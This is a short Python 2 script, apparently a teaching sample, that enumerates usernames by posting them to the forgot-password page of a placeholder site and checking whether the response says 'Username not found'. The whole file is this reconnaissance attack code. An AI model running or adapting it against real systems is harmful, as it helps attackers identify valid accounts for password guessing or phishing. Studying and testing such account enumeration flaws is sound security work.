#basic username check
import sys
import urllib
import urllib2

if len(sys.argv) !=2:
    print "usage: %s username" % (sys.argv[0])
    sys.exit(0)

url = "http://www.vulnerablesite.com/forgotpassword.html"
username = str(sys.argv[1])
data = urllib.urlencode({"username":username})
response = urllib2.urlopen(url,data).read()
UnknownStr="Username not found"
if(response.find(UnknownStr)<0):
	print "Username exists!"
